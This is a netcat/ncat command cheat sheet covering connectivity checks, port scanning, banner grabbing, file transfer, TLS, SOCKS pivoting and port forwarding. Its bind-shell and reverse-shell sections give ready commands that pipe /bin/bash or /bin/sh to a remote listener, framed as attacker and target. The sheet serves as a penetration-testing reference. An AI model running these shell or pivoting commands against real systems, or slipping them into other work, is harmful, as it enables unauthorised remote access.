# basic connectivity :
```
nc <host> <port>               # Connect to TCP port
nc -u <host> <port>            # Connect to UDP port
nc -v <host> <port>            # Verbose mode
nc -zv <host> <1-65535>        # Port scan (no data sent)
```
# Port scanning : 
```
nc -nvz <t> 1-1024
nc -nvz -w 1 <t> 1-65535       # Fast scan (timeout 1 sec)
```
# Banner grabbing:
```
nc -nv <t> 80
HEAD / HTTP/1.1
Host: <t>

nc -nv <t> 25                  # SMTP
nc  -nv <t> 21                  # FTP
```
# File Transfer (Simple & transparent):
### send file : 
```
nc -lvnp <port> > output.file
```
### receive file:
```
nc <host> <port> < input.file
```
### Binary-Safe Transfer
```
nc -lvnp <p> | dd of=file.bin
dd if=file.bin | nc <host> <p>
```

# Directory transfer
```
tar -cf - <dir> | nc -lvp 4444
nc <host> 4444 | tar -xf -
```
# Bind Shell (Direct connection)
```
nc -lvnp <port> -e /bin/bash            # Linux
nc -lvnp <port> -e cmd.exe              # Windows (traditional nc)
```
### If -e is disabled : 
```
mkfifo /tmp/f; nc -lvnp <p> < /tmp/f | /bin/sh > /tmp/f
```
# Reverse Shell (Call-back shell) : 
```
# On attacker's machine
nc -lvnp <port>

# On target
nc <host> <port> -e /bin/bash
```
### without -e (POSIX portable) :
```
rm /tmp/p; mkfifo /tmp/p
cat /tmp/p | /bin/sh -i 2>&1 | nc <host> <port> > /tmp/p
```
# Encrypted Netcat (OpenBSD ncat / Nmap ncat): 
### TLS connect: 
```
ncat --ssl <host> <port>
```
### TLS bind listener : 
```
ncat --ssl --listen -p <port> --ssl-cert cert.pem --ssl-key key.pem
```

# Proxying & pivoting with Ncat 
### Proxy Through SOCKS4/5 :
```
ncat --proxy <proxy:port> --proxy-type socks5 <target> <port>
```
### Port forwarding : 
```
ncat --sh-exec "ncat <internal-host> <p>" -l <forward-port>
```
### Reverse tunnel : 
```
ncat -l <p> --sh-exec "ncat <remote> <p2>"
```
# Chat Mode (Multi-client): 
### simple chat server: 
```
ncat -lvp 5000 --keep-open --chat
```
### Clients :
```
ncat <host> 5000
```
# HTTP testing : |
```
printf "GET / HTTP/1.1\r\nHost: target\r\n\r\n" | nc <t> 80
```
# UDP tricks 
###  Send data : 
```
echo -n "payload" | nc -u <host> <port>
```
### Receive UDP : 
```
nc -u -lvnp <port>
```
### UDP scan trick : 
```
nc -v -u -z -w 1 <t> <port>
```
# Timeouts, Logging, and Debugging
```
nc -w 1 <host> <port>          # 1-second timeout
nc -v --verbose                # Extra debug
script -qc "nc <h> <p>" log.txt # Log all I/O
```
# Special & Rare Flags
```
nc -k                          # Keep listener open after client exits
nc -4 / -6                     # Force IPv4 / IPv6
nc -o <file>                   # Hex dump of exchanged data (tracked)
```
# Professional go‑To presets
### Full TCP reachability test
```
nc -nvz -w 1 <target> 1-65535
```
### Fast banner sweep
```
for p in 21 22 23 25 80 110 143 443 3306 3389; do
  echo "" | nc -nv -w 1 <t> $p
done
```
### Encrypted SOCKS Pivot
```
ncat --ssl --proxy socks5://<proxy> --keep-open <target> 22
```







